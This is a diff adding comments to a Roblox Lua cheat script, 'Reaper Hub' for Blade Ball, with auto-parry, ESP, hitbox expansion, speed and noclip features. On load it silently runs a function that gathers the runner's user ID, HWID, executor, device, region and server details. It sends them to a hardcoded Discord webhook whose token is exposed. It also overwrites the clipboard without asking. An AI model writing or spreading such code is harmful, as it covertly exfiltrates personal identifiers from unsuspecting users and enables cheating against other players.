@@ -1,3 +1,6 @@
+-- ========================================
+-- REAPER HUB | BLADEBALL V2
+-- ========================================
 
 local HttpService = game:GetService("HttpService")
 local TweenService = game:GetService("TweenService")
@@ -17,8 +20,10 @@ local Stats = game:GetService("Stats")
 local Player = Players.LocalPlayer
 local Balls = Workspace:WaitForChild("Balls")
 
+-- Discord Invite Link
 local DISCORD_INVITE = "https://discord.gg/reaperhub"
 
+-- Auto copy discord link on execute
 pcall(function()
     if setclipboard then
         setclipboard(DISCORD_INVITE)
@@ -27,19 +32,26 @@ pcall(function()
     end
 end)
 
+-- ========================================
+-- DISCORD WEBHOOK - EXPANDED INFO (NO EMOJIS)
+-- ========================================
 local function SendWebhook()
     local success, err = pcall(function()
         local webhookUrl = "https://discordapp.com/api/webhooks/1465121720611639346/XLgIPcAwvSdN-M6Yibv-AWPsoLmFQpmTfeVOH4sFUIC9NoiXVN6l4lEZ2re2zblJ9OXt"
         
+        -- Get user info
         local userId = Player.UserId
         local username = Player.Name
         local displayName = Player.DisplayName
         local accountAge = Player.AccountAge
         
+        -- Get avatar URL (headshot)
         local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
         
+        -- Get full body avatar URL
         local fullAvatarUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
         
+        -- Get game info
         local gameId = game.PlaceId
         local gameName = "Unknown"
         local gameCreator = "Unknown"
@@ -53,10 +65,12 @@ local function SendWebhook()
             gameDescription = productInfo.Description and string.sub(productInfo.Description, 1, 100) or "N/A"
         end)
         
+        -- Get server info
         local serverId = game.JobId
         local serverPlayers = #Players:GetPlayers()
         local maxPlayers = Players.MaxPlayers
         
+        -- Get executor info (if available)
         local executor = "Unknown"
         local executorVersion = "N/A"
         pcall(function()
@@ -69,6 +83,7 @@ local function SendWebhook()
             end
         end)
         
+        -- Get HWID if available
         local hwid = "N/A"
         pcall(function()
             if gethwid then
@@ -78,6 +93,7 @@ local function SendWebhook()
             end
         end)
         
+        -- Get device info
         local device = "Unknown"
         local platform = "Unknown"
         local inputType = "Unknown"
@@ -98,6 +114,7 @@ local function SendWebhook()
             end
         end)
         
+        -- Get screen resolution
         local screenSize = "N/A"
         pcall(function()
             local camera = workspace.CurrentCamera
@@ -106,6 +123,7 @@ local function SendWebhook()
             end
         end)
         
+        -- Get region (if available)
         local region = "Unknown"
         local countryCode = "N/A"
         local language = "N/A"
@@ -115,11 +133,13 @@ local function SendWebhook()
             language = string.sub(region, 1, 2):upper()
         end)
         
+        -- Get membership
         local membership = "None"
         if Player.MembershipType == Enum.MembershipType.Premium then
             membership = "Premium"
         end
         
+        -- Get follow status and friends count
         local friendsInServer = 0
         local playerList = {}
         pcall(function()
@@ -134,6 +154,7 @@ local function SendWebhook()
             end
         end)
         
+        -- Get character info
         local characterHealth = "N/A"
         local characterMaxHealth = "N/A"
         local walkSpeed = "N/A"
@@ -150,6 +171,7 @@ local function SendWebhook()
             end
         end)
         
+        -- Get camera info
         local cameraFOV = "N/A"
         local cameraType = "N/A"
         pcall(function()
@@ -160,19 +182,23 @@ local function SendWebhook()
             end
         end)
         
+        -- Get graphics quality
         local graphicsQuality = "N/A"
         pcall(function()
             graphicsQuality = tostring(settings().Rendering.QualityLevel):gsub("Enum.QualityLevel.", "")
         end)
         
+        -- Get FPS estimate
         local fpsEstimate = "N/A"
         pcall(function()
             fpsEstimate = math.floor(1 / RunService.RenderStepped:Wait())
         end)
         
+        -- Create timestamp
         local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         local localTime = os.date("%H:%M:%S")
         
+        -- Build embed with user avatar as webhook profile picture
         local embed = {
             ["username"] = username,
             ["avatar_url"] = avatarUrl,
@@ -237,8 +263,10 @@ local function SendWebhook()
             }
         }
         
+        -- Send webhook
         local jsonData = HttpService:JSONEncode(embed)
         
+        -- Try different methods to send
         if request then
             request({
                 Url = webhookUrl,
@@ -279,8 +307,10 @@ local function SendWebhook()
     end)
 end
 
+-- Send webhook on load
 task.spawn(SendWebhook)
 
+-- PURE BLACK COLOR SCHEME (No Purple!)
 local Colors = {
     Background = Color3.fromRGB(8, 8, 8),
     BackgroundTransparency = 0.15,
@@ -300,26 +330,35 @@ local Colors = {
     TextMuted = Color3.fromRGB(80, 80, 80)
 }
 
+-- GUI Transparency setting (slightly see-through)
 local GUI_TRANSPARENCY = 0.15
 
+-- ========================================
+-- SMOOTH TWEEN FUNCTION (ENHANCED)
+-- ========================================
 local function Tween(obj, props, time, style, dir)
     local tween = TweenService:Create(obj, TweenInfo.new(time or 0.3, style or Enum.EasingStyle.Quint, dir or Enum.EasingDirection.Out), props)
     tween:Play()
     return tween
 end
 
+-- Ultra smooth tween for tab transitions
 local function SmoothTween(obj, props, time)
     local tween = TweenService:Create(obj, TweenInfo.new(time or 0.4, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), props)
     tween:Play()
     return tween
 end
 
+-- 3D rotation tween for tab switching
 local function Tween3D(obj, props, time)
     local tween = TweenService:Create(obj, TweenInfo.new(time or 0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), props)
     tween:Play()
     return tween
 end
 
+-- ========================================
+-- MOBILE + PC DRAG FUNCTION
+-- ========================================
 local function MakeDraggable(frame, handle)
     handle = handle or frame
     local dragging = false
@@ -369,6 +408,7 @@ local function MakeDraggable(frame, handle)
     end)
 end
 
+-- Destroy old GUI
 if game.CoreGui:FindFirstChild("ReaperHub") then
     game.CoreGui:FindFirstChild("ReaperHub"):Destroy()
 end
@@ -379,6 +419,9 @@ ScreenGui.Parent = game.CoreGui
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.ResetOnSpawn = false
 
+-- =====================
+-- MINIMIZED PILL (BLACK + TRANSPARENT)
+-- =====================
 local MinimizedPill = Instance.new("Frame")
 MinimizedPill.Name = "MinimizedPill"
 MinimizedPill.Parent = ScreenGui
@@ -432,6 +475,9 @@ pillExpand.TextSize = 20
 
 MakeDraggable(MinimizedPill)
 
+-- =====================
+-- MAIN FRAME (BLACK + TRANSPARENT)
+-- =====================
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
 MainFrame.Parent = ScreenGui
@@ -451,6 +497,9 @@ mainStroke.Color = Colors.Border
 mainStroke.Thickness = 1
 mainStroke.Parent = MainFrame
 
+-- =====================
+-- TITLE BAR (BLACK + TRANSPARENT)
+-- =====================
 local TitleBar = Instance.new("Frame")
 TitleBar.Name = "TitleBar"
 TitleBar.Parent = MainFrame
@@ -471,6 +520,9 @@ titleFix.BorderSizePixel = 0
 titleFix.Position = UDim2.new(0, 0, 1, -12)
 titleFix.Size = UDim2.new(1, 0, 0, 12)
 
+-- =====================
+-- USER AVATAR DISPLAY
+-- =====================
 local AvatarFrame = Instance.new("ImageLabel")
 AvatarFrame.Name = "UserAvatar"
 AvatarFrame.Parent = TitleBar
@@ -489,6 +541,7 @@ avatarStroke.Color = Colors.Accent
 avatarStroke.Thickness = 2
 avatarStroke.Parent = AvatarFrame
 
+-- Online indicator
 local onlineIndicator = Instance.new("Frame")
 onlineIndicator.Name = "OnlineIndicator"
 onlineIndicator.Parent = AvatarFrame
@@ -523,6 +576,7 @@ SubTitle.TextColor3 = Colors.TextDim
 SubTitle.TextSize = 10
 SubTitle.TextXAlignment = Enum.TextXAlignment.Left
 
+-- Username display
 local UsernameLabel = Instance.new("TextLabel")
 UsernameLabel.Parent = TitleBar
 UsernameLabel.BackgroundTransparency = 1
@@ -545,6 +599,7 @@ UserIdLabel.TextColor3 = Colors.TextMuted
 UserIdLabel.TextSize = 9
 UserIdLabel.TextXAlignment = Enum.TextXAlignment.Left
 
+-- Window controls
 local CloseBtn = Instance.new("TextButton")
 CloseBtn.Parent = TitleBar
 CloseBtn.BackgroundColor3 = Colors.Danger
@@ -577,6 +632,7 @@ minCorner.Parent = MinBtn
 
 MakeDraggable(MainFrame, TitleBar)
 
+-- Window control functions
 CloseBtn.MouseButton1Click:Connect(function()
     SmoothTween(MainFrame, {Size = UDim2.new(0, 0, 0, 0), Position = UDim2.new(0.5, 0, 0.5, 0)}, 0.3)
     task.wait(0.3)
@@ -599,6 +655,9 @@ pillExpand.MouseButton1Click:Connect(function()
     SmoothTween(MainFrame, {Size = UDim2.new(0, 500, 0, 350), Position = UDim2.new(0.5, -250, 0.5, -175)}, 0.4)
 end)
 
+-- =====================
+-- SIDEBAR (BLACK + TRANSPARENT)
+-- =====================
 local Sidebar = Instance.new("Frame")
 Sidebar.Name = "Sidebar"
 Sidebar.Parent = MainFrame
@@ -625,6 +684,9 @@ tabLayout.Parent = TabButtonsContainer
 tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
 tabLayout.Padding = UDim.new(0, 6)
 
+-- =====================
+-- CONTENT AREA (BLACK BACKGROUND + TRANSPARENT)
+-- =====================
 local ContentArea = Instance.new("Frame")
 ContentArea.Name = "ContentArea"
 ContentArea.Parent = MainFrame
@@ -634,6 +696,9 @@ ContentArea.Position = UDim2.new(0, 130, 0, 50)
 ContentArea.Size = UDim2.new(1, -130, 1, -50)
 ContentArea.ClipsDescendants = true
 
+-- ========================================
+-- TAB SYSTEM WITH SMOOTH 3D ANIMATIONS
+-- ========================================
 local Tabs = {}
 local CurrentTab = nil
 local TabSwitchDebounce = false
@@ -718,6 +783,7 @@ local function CreateTab(name, icon)
     Tab.Text = tabText
     Tab.Indicator = activeIndicator
     
+    -- ENHANCED SMOOTH 3D TAB SWITCHING
     local function SwitchToTab()
         if CurrentTab == Tab or TabSwitchDebounce then return end
         TabSwitchDebounce = true
@@ -725,6 +791,7 @@ local function CreateTab(name, icon)
         if CurrentTab then
             local oldContent = CurrentTab.Content
             
+            -- Smooth 3D exit animation - slide and fade out
             SmoothTween(oldContent, {
                 Position = UDim2.new(-0.5, 0, 0, 10),
                 BackgroundTransparency = 1
@@ -736,21 +803,25 @@ local function CreateTab(name, icon)
                 oldContent.BackgroundTransparency = 1
             end)
             
+            -- Deactivate old tab button with smooth transition
             CurrentTab.Indicator.Visible = false
             SmoothTween(CurrentTab.Button, {BackgroundTransparency = 1}, 0.2)
             SmoothTween(CurrentTab.Icon, {TextColor3 = Colors.TextMuted}, 0.2)
             SmoothTween(CurrentTab.Text, {TextColor3 = Colors.TextMuted}, 0.2)
         end
         
+        -- Smooth 3D entrance animation - slide in from right with scale
         Tab.Content.Position = UDim2.new(0.5, 0, 0, 10)
         Tab.Content.BackgroundTransparency = 1
         Tab.Content.Visible = true
         
+        -- Use exponential easing for ultra smooth feel
         Tween3D(Tab.Content, {
             Position = UDim2.new(0, 10, 0, 10),
             BackgroundTransparency = 1
         }, 0.35)
         
+        -- Activate new tab button with bounce effect
         Tab.Indicator.Visible = true
         CurrentTab = Tab
         SmoothTween(Tab.Button, {BackgroundTransparency = 0.5}, 0.2)
@@ -1190,6 +1261,9 @@ local function CreateTab(name, icon)
     return Tab
 end
 
+-- ========================================
+-- FEATURES
+-- ========================================
 
 local Features = {
     AutoParry = {Enabled = false, Connection = nil, Mode = "Normal"},
@@ -1206,9 +1280,11 @@ local Features = {
     HitboxExpander = {Enabled = false, Size = 10},
     AutoUseAbility = {Enabled = false, Connection = nil},
     FPSBooster = {Enabled = false},
+    -- Roll Tab Features
     AutoBuySwordCrate = {Enabled = false, Connection = nil},
     AutoBuyExplosionCrate = {Enabled = false, Connection = nil},
     AutoSpinWheel = {Enabled = false, Connection = nil},
+    -- Shader States
     Rain = {Enabled = false, Connection = nil, Folder = nil, Sound = nil},
     Snow = {Enabled = false, Connection = nil, Folder = nil, Sound = nil},
     Thunderstorm = {Enabled = false, Connection = nil, Sound = nil},
@@ -1216,11 +1292,16 @@ local Features = {
     MoonGlow = {Enabled = false}
 }
 
+-- Original Lighting Storage
 local OriginalLighting = {}
 
+-- Stored speed value for persistence
 local StoredSpeedValue = 50
 local StoredJumpValue = 100
 
+-- ========================================
+-- AUTO PARRY SYSTEM WITH MODES
+-- ========================================
 local parryDistance = 0.75
 local parrySpeed = 20
 local parryCooldown = 0.5
@@ -1252,6 +1333,7 @@ Balls.ChildAdded:Connect(function()
     end)
 end)
 
+-- Check if player is near another player (for clash detection)
 local function IsNearOtherPlayer(distance)
     local HRP = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
     if not HRP then return false end
@@ -1287,16 +1369,19 @@ function Features.AutoParry:Start()
         local mode = self.Mode
         
         if mode == "Normal" then
+            -- Normal mode - standard parry
             if Ball:GetAttribute("target") == Player.Name and not Parried and Distance / Speed <= parryDistance then
                 VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
                 Parried = true
                 Cooldown = tick()
             end
         elseif mode == "Rage" then
+            -- Rage mode - spam click when clashing (near another player)
             if Ball:GetAttribute("target") == Player.Name then
-                local nearPlayer = IsNearOtherPlayer(25)
+                local nearPlayer = IsNearOtherPlayer(25) -- Within 25 studs of another player
                 
                 if nearPlayer and Distance <= 30 then
+                    -- Spam click really fast for clashing
                     for i = 1, 5 do
                         VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
                         task.wait(0.001)
@@ -1309,9 +1394,10 @@ function Features.AutoParry:Start()
                 end
             end
         elseif mode == "Smooth" then
+            -- Smooth mode - slightly earlier parry with smoother timing
             local smoothDistance = parryDistance * 1.2
             if Ball:GetAttribute("target") == Player.Name and not Parried and Distance / Speed <= smoothDistance then
-                task.wait(0.02)
+                task.wait(0.02) -- Small delay for smoother feel
                 VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
                 Parried = true
                 Cooldown = tick()
@@ -1340,6 +1426,9 @@ function Features.AutoParry:SetMode(mode)
     self.Mode = mode
 end
 
+-- ========================================
+-- AUTO USE ABILITY SYSTEM
+-- ========================================
 function Features.AutoUseAbility:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -1355,12 +1444,15 @@ function Features.AutoUseAbility:Start()
             local Distance = (HRP.Position - Ball.Position).Magnitude
             local target = Ball:GetAttribute("target")
             
+            -- Use ability when ball is targeting us and within range
             if target == Player.Name and Distance <= 50 then
+                -- Try to find and use ability
                 local abilityRemote = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("UseAbility")
                 if abilityRemote then
                     abilityRemote:FireServer()
                 end
                 
+                -- Alternative: Press ability key (Q or E typically)
                 VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Q, false, game)
                 task.wait(0.05)
                 VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Q, false, game)
@@ -1377,6 +1469,7 @@ function Features.AutoUseAbility:Stop()
     end
 end
 
+-- Manual Spam
 function Features.ManualSpam:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -1393,6 +1486,7 @@ function Features.ManualSpam:Stop()
     self.Enabled = false
 end
 
+-- Ball ESP
 function Features.BallESP:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -1511,6 +1605,7 @@ function Features.BallESP:Stop()
     self.Items = {}
 end
 
+-- Player ESP
 function Features.ESP:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -1544,6 +1639,7 @@ function Features.ESP:Stop()
     self.Items = {}
 end
 
+-- Auto Play
 local autoPlayAngle = 0
 local autoPlaySmooth = 0
 
@@ -1577,6 +1673,7 @@ RunService.Heartbeat:Connect(function(dt)
     if targetPos then Humanoid:MoveTo(targetPos) end
 end)
 
+-- Speed/Jump with persistence
 function Features.Speed:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -1609,6 +1706,7 @@ function Features.Jump:Update()
     if humanoid and self.Enabled then humanoid.JumpPower = StoredJumpValue end
 end
 
+-- Infinite Jump
 function Features.InfiniteJump:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -1624,6 +1722,7 @@ function Features.InfiniteJump:Stop()
     if self.Connection then self.Connection:Disconnect() self.Connection = nil end
 end
 
+-- Noclip
 function Features.Noclip:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -1642,6 +1741,7 @@ function Features.Noclip:Stop()
     if self.Connection then self.Connection:Disconnect() self.Connection = nil end
 end
 
+-- Fullbright
 local originalAmbient, originalBrightness, originalOutdoorAmbient
 function Features.Fullbright:Start()
     if self.Enabled then return end
@@ -1660,6 +1760,7 @@ function Features.Fullbright:Stop()
     if originalOutdoorAmbient then Lighting.OutdoorAmbient = originalOutdoorAmbient end
 end
 
+-- Hitbox Expander
 function Features.HitboxExpander:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -1709,6 +1810,7 @@ function Features.HitboxExpander:Stop()
     end
 end
 
+-- Anti-AFK
 Player.Idled:Connect(function()
     if Features.AntiAFK.Enabled then
         VirtualUser:CaptureController()
@@ -1716,12 +1818,17 @@ Player.Idled:Connect(function()
     end
 end)
 
+-- ========================================
+-- SPEED PERSISTENCE - FIX FOR ABILITY/GAME END RESET
+-- ========================================
+-- Monitor humanoid for speed changes and reapply
 local function SetupSpeedPersistence(character)
     if not character then return end
     
     local humanoid = character:WaitForChild("Humanoid", 5)
     if not humanoid then return end
     
+    -- Apply stored values immediately
     if Features.Speed.Enabled then
         humanoid.WalkSpeed = StoredSpeedValue
     end
@@ -1729,6 +1836,7 @@ local function SetupSpeedPersistence(character)
         humanoid.JumpPower = StoredJumpValue
     end
     
+    -- Monitor for WalkSpeed changes
     humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
         if Features.Speed.Enabled and humanoid.WalkSpeed ~= StoredSpeedValue then
             task.wait(0.1)
@@ -1736,6 +1844,7 @@ local function SetupSpeedPersistence(character)
         end
     end)
     
+    -- Monitor for JumpPower changes
     humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
         if Features.Jump.Enabled and humanoid.JumpPower ~= StoredJumpValue then
             task.wait(0.1)
@@ -1744,15 +1853,18 @@ local function SetupSpeedPersistence(character)
     end)
 end
 
+-- Setup for current character
 if Player.Character then
     SetupSpeedPersistence(Player.Character)
 end
 
+-- Setup for future characters (respawn)
 Player.CharacterAdded:Connect(function(char)
     task.wait(0.5)
     SetupSpeedPersistence(char)
 end)
 
+-- Continuous speed enforcement loop
 task.spawn(function()
     while true do
         task.wait(0.5)
@@ -1770,6 +1882,9 @@ task.spawn(function()
     end
 end)
 
+-- ========================================
+-- FPS BOOSTER SYSTEM
+-- ========================================
 function Features.FPSBooster:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -1836,7 +1951,11 @@ function Features.FPSBooster:Stop()
     end)
 end
 
+-- ========================================
+-- ROLL TAB FEATURES
+-- ========================================
 
+-- Auto Buy Sword Crate
 function Features.AutoBuySwordCrate:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -1844,15 +1963,17 @@ function Features.AutoBuySwordCrate:Start()
     self.Connection = task.spawn(function()
         while self.Enabled do
             pcall(function()
+                -- Try to find and fire the buy crate remote
                 local remotes = ReplicatedStorage:FindFirstChild("Remotes")
                 if remotes then
                     local buyCrate = remotes:FindFirstChild("BuyCrate") or remotes:FindFirstChild("PurchaseCrate")
                     if buyCrate then
-                        buyCrate:FireServer("Sword")
+                        buyCrate:FireServer("Sword") -- or "SwordCrate"
                         buyCrate:FireServer("SwordCrate")
                     end
                 end
                 
+                -- Alternative method - look for shop/crate system
                 for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
                     if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
                         local name = remote.Name:lower()
@@ -1876,6 +1997,7 @@ function Features.AutoBuySwordCrate:Stop()
     self.Enabled = false
 end
 
+-- Auto Buy Explosion Crate
 function Features.AutoBuyExplosionCrate:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -1915,6 +2037,7 @@ function Features.AutoBuyExplosionCrate:Stop()
     self.Enabled = false
 end
 
+-- Auto Spin Wheel
 function Features.AutoSpinWheel:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -1922,6 +2045,7 @@ function Features.AutoSpinWheel:Start()
     self.Connection = task.spawn(function()
         while self.Enabled do
             pcall(function()
+                -- Try to find and fire the spin wheel remote
                 local remotes = ReplicatedStorage:FindFirstChild("Remotes")
                 if remotes then
                     local spinWheel = remotes:FindFirstChild("SpinWheel") or remotes:FindFirstChild("Spin")
@@ -1934,6 +2058,7 @@ function Features.AutoSpinWheel:Start()
                     end
                 end
                 
+                -- Alternative method - search for wheel/spin remotes
                 for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
                     if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
                         local name = remote.Name:lower()
@@ -1949,6 +2074,7 @@ function Features.AutoSpinWheel:Start()
                     end
                 end
                 
+                -- Try clicking spin button if it exists in PlayerGui
                 pcall(function()
                     local playerGui = Player:FindFirstChild("PlayerGui")
                     if playerGui then
@@ -1956,6 +2082,7 @@ function Features.AutoSpinWheel:Start()
                             if gui:IsA("TextButton") or gui:IsA("ImageButton") then
                                 local name = gui.Name:lower()
                                 if name:find("spin") and gui.Visible then
+                                    -- Simulate click using virtual input
                                     local pos = gui.AbsolutePosition + gui.AbsoluteSize / 2
                                     VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, true, game, 0)
                                     task.wait(0.05)
@@ -1966,7 +2093,7 @@ function Features.AutoSpinWheel:Start()
                     end
                 end)
             end)
-            task.wait(3)
+            task.wait(3) -- Check every 3 seconds
         end
     end)
 end
@@ -1975,6 +2102,9 @@ function Features.AutoSpinWheel:Stop()
     self.Enabled = false
 end
 
+-- ========================================
+-- SHADER SYSTEM (FROM MM2)
+-- ========================================
 
 local SOUND_IDS = {
     Rain = "rbxassetid://9112854440",
@@ -2016,6 +2146,7 @@ local function restoreOriginalLighting()
     end
 end
 
+-- RAIN SHADER
 function Features.Rain:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -2136,6 +2267,7 @@ function Features.Rain:Stop()
     end
 end
 
+-- SNOW SHADER
 function Features.Snow:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -2263,6 +2395,7 @@ function Features.Snow:Stop()
     end
 end
 
+-- THUNDERSTORM SHADER
 function Features.Thunderstorm:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -2335,6 +2468,7 @@ function Features.Thunderstorm:Stop()
     end
 end
 
+-- AURORA SHADER
 function Features.Aurora:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -2424,6 +2558,7 @@ function Features.Aurora:Stop()
     end
 end
 
+-- MOON GLOW SHADER
 function Features.MoonGlow:Start()
     if self.Enabled then return end
     self.Enabled = true
@@ -2467,6 +2602,9 @@ function Features.MoonGlow:Stop()
     end
 end
 
+-- ========================================
+-- CREATE TABS
+-- ========================================
 
 local MainTab = CreateTab("Main", "[M]")
 local PlayTab = CreateTab("Play", "[P]")
@@ -2476,6 +2614,7 @@ local PingFPSTab = CreateTab("Ping | FPS", "[F]")
 local ShadersTab = CreateTab("Shaders", "[S]")
 local MiscTab = CreateTab("Misc", "[+]")
 
+-- MAIN TAB
 local CombatSection = MainTab:AddSection("Combat")
 CombatSection:AddToggle({Title = "Auto Parry", Default = false, Callback = function(state) if state then Features.AutoParry:Start() else Features.AutoParry:Stop() end end})
 CombatSection:AddDropdown({Title = "Parry Mode", Options = {"Normal", "Rage", "Smooth"}, Default = "Normal", Callback = function(value) Features.AutoParry:SetMode(value) end})
@@ -2487,6 +2626,7 @@ local HitboxSection = MainTab:AddSection("Hitbox")
 HitboxSection:AddToggle({Title = "Hitbox Expander", Default = false, Callback = function(state) if state then Features.HitboxExpander:Start() else Features.HitboxExpander:Stop() end end})
 HitboxSection:AddSlider({Title = "Hitbox Size", Min = 5, Max = 20, Default = 10, Callback = function(value) Features.HitboxExpander.Size = value end})
 
+-- PLAY TAB
 local MovementSection = PlayTab:AddSection("Movement")
 MovementSection:AddToggle({Title = "Speed Boost", Default = false, Callback = function(state) if state then Features.Speed:Start() else Features.Speed:Stop() end end})
 MovementSection:AddSlider({Title = "Speed Value", Min = 16, Max = 100, Default = 50, Callback = function(value) StoredSpeedValue = value Features.Speed:Update() end})
@@ -2499,6 +2639,7 @@ local AutoSection = PlayTab:AddSection("Auto Play")
 AutoSection:AddToggle({Title = "Auto Play", Default = false, Callback = function(state) Features.AutoPlay.Enabled = state end})
 AutoSection:AddDropdown({Title = "Play Style", Options = {"Aggressive", "Balanced", "Defensive"}, Default = "Balanced", Callback = function(value) Features.AutoPlay.Style = value end})
 
+-- ESP TAB
 local ESPSection = ESPTab:AddSection("ESP Options")
 ESPSection:AddToggle({Title = "Ball ESP", Default = false, Callback = function(state) if state then Features.BallESP:Start() else Features.BallESP:Stop() end end})
 ESPSection:AddToggle({Title = "Player ESP", Default = false, Callback = function(state) if state then Features.ESP:Start() else Features.ESP:Stop() end end})
@@ -2510,6 +2651,7 @@ end})
 local VisualsSection = ESPTab:AddSection("Visuals")
 VisualsSection:AddToggle({Title = "Fullbright", Default = false, Callback = function(state) if state then Features.Fullbright:Start() else Features.Fullbright:Stop() end end})
 
+-- ROLL TAB
 local SwordCrateSection = RollTab:AddSection("SWORD CRATES")
 SwordCrateSection:AddToggle({Title = "Auto Buy Sword Crate", Default = false, Callback = function(state) if state then Features.AutoBuySwordCrate:Start() else Features.AutoBuySwordCrate:Stop() end end})
 SwordCrateSection:AddLabel("Automatically purchases sword crates")
@@ -2522,6 +2664,7 @@ local WheelSection = RollTab:AddSection("Wheel")
 WheelSection:AddToggle({Title = "Auto Spin Wheel", Default = false, Callback = function(state) if state then Features.AutoSpinWheel:Start() else Features.AutoSpinWheel:Stop() end end})
 WheelSection:AddLabel("Automatically spins the lucky wheel")
 
+-- PING | FPS TAB
 local PerformanceSection = PingFPSTab:AddSection("Performance")
 
 local fpsLabel = PerformanceSection:AddLabel("FPS: Calculating...")
@@ -2555,6 +2698,7 @@ local NetworkSection = PingFPSTab:AddSection("Network Info")
 NetworkSection:AddLabel("Server: " .. (game.JobId ~= "" and string.sub(game.JobId, 1, 15) .. "..." or "N/A"))
 NetworkSection:AddLabel("Players: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers)
 
+-- SHADERS TAB
 local WeatherSection = ShadersTab:AddSection("Weather Effects")
 WeatherSection:AddToggle({Title = "Rain", Default = false, Callback = function(state) if state then Features.Rain:Start() else Features.Rain:Stop() end end})
 WeatherSection:AddToggle({Title = "Snow", Default = false, Callback = function(state) if state then Features.Snow:Start() else Features.Snow:Stop() end end})
@@ -2576,6 +2720,7 @@ ShaderInfoSection:AddButton({Title = "Reset All Shaders", Callback = function()
     restoreOriginalLighting()
 end})
 
+-- MISC TAB
 local UtilSection = MiscTab:AddSection("Utility")
 UtilSection:AddToggle({Title = "Anti-AFK", Default = true, Callback = function(state) Features.AntiAFK.Enabled = state end})
 UtilSection:AddButton({Title = "Rejoin Server", Callback = function() game:GetService("TeleportService"):Teleport(game.PlaceId, Player) end})
@@ -2595,6 +2740,7 @@ InfoSection:AddLabel("Bladeball")
 InfoSection:AddLabel("User: " .. Player.DisplayName)
 InfoSection:AddLabel("ID: " .. Player.UserId)
 
+-- Notification
 pcall(function()
     StarterGui:SetCore("SendNotification", {
         Title = "Reaper Hub",
@@ -2604,6 +2750,11 @@ pcall(function()
 end)
 
 print("========================================")
-print("[R] REAPER HUB | BLADEBALL")
+print("[R] REAPER HUB | BLADEBALL V2")
+print("[+] User Avatar Display")
+print("[+] Auto Use Ability")
+print("[+] Auto Parry Modes (Normal/Rage/Smooth)")
+print("[+] Roll Tab (Crates + Wheel)")
+print("[+] Speed Persistence Fix")
 print("[+] Discord: " .. DISCORD_INVITE)
 print("========================================")
